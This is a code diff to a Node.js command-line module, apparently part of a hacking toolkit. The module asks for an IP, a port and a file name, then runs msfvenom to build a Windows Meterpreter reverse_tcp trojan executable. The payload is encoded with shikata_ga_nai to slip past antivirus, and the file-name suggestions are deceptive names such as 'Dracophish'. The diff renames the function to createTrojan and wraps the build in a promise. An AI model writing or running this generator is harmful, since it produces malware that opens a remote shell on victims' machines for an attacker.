@@ -1,6 +1,9 @@
 const inquirer = require("inquirer");
+inquirer.registerPrompt("suggest", require("inquirer-prompt-suggest"));
 
-exports.hack = (exec) => {
+exports.createTrojan = (exec, q) => {
+  var deferred = q.defer();
+
   inquirer
     .prompt([
       {
@@ -15,24 +18,33 @@ exports.hack = (exec) => {
         default: "3333",
       },
       {
-        type: "input",
+        type: "suggest",
         message: "Enter desired file name",
         name: "fileName",
-        default: "trojan",
+        suggestions: [
+          "Grenbufoat",
+          "Lucarencrypt",
+          "Metaspoof",
+          "Haxxorus",
+          "Regicontrol",
+          "Dracophish",
+        ],
       },
     ])
-    .then((response) => {
-      const command = `sudo msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=${response.ip} LPORT=${response.port} -b x00 -e x86/shikata_ga_nai -f exe -o ../bin/${response.fileName}.exe`;
+    .then((answer) => {
+      const createTrojan =
+        `msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp` +
+        ` LHOST=${answer.ip} LPORT=${answer.port} -b x00 -e x86/shikata_ga_nai -f exe -o bin/${answer.fileName}.exe`;
 
-      exec(command, (error, stdout, stderr) => {
-        console.log("stdout", stdout);
-        console.log("stderr", stderr);
-        if (error !== null) {
-          console.log(error);
-        }
+      exec(createTrojan, (error, stdout, stderr) => {
+        return error
+          ? deferred.reject(stderr + new Error(error.stack || error))
+          : deferred.resolve(stdout);
       });
     })
     .catch((error) => {
       console.log(error);
     });
+
+  return deferred.promise;
 };
